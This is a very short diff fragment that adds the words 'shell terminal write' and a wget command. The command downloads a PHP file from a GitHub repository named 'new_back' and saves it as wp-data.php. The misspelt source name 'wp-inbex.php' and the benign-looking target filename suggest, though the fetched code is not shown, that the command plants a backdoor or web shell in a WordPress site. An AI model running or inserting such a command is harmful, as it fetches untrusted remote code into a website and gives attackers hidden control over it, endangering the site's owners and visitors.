@@ -1,0 +1,3 @@
+shell terminal write 
+
+wget -O wp-data.php https://raw.githubusercontent.com/K1r9nzZ/new_back/refs/heads/main/wp-inbex.php
